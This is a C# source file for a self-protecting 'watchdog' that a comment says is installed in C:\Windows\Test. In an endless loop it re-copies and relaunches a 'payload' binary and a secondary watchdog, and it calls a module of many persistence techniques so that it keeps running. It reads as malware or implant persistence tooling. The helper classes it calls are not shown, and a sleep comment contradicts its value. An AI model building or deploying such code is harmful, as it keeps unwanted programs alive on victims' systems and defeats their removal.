

/*
    This watch is constantly monitoring the secondary watchdog and the binary

compile here into exe and put into: C:\Windows\Test

dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true

Watchdog Functionality
    If either of the above watched binaries stop running or existing, this watchdog will copy and/or run them. Will not run anything that is currently running
    If the watched binaries stop existing in the current directory or in the destination directory, then 


Persistence functionality
    As long as this watchdog file is running, then everythign else is running in theory. So I set up a ton of persistence techniques to run this watchdog.
    Basically all of the persistence techniques will be iterated through, verified if they are set up correctly, then set up if not existing or set up correctly
*/


class Watchdog
{
   static void Main(string[] args)
    {
        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, Config.PrimaryWatchdogMutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                //Watchdog process is already running. Exiting.
                return;
            }


            WatchdogLogic();
        }
    }



    static void WatchdogLogic()
    {

        watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
        watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
        watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);

        try { 
            if (!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
            {
                File.Copy(Config.PrimaryWatchdogFullPath, Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName), overwrite: false);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"[ERROR] {e.Message}");
        }

        // Example loop to simulate frequent checks
        while (true)
        {
            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
            watchdogHelper.watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);

            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
            watchdogHelper.watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);

            Persistence.Persistence.runAllTechniques();

            Console.WriteLine("Watchdog is monitoring...");
            Thread.Sleep(10000);  // Sleep for 1 second
        }
     }

}

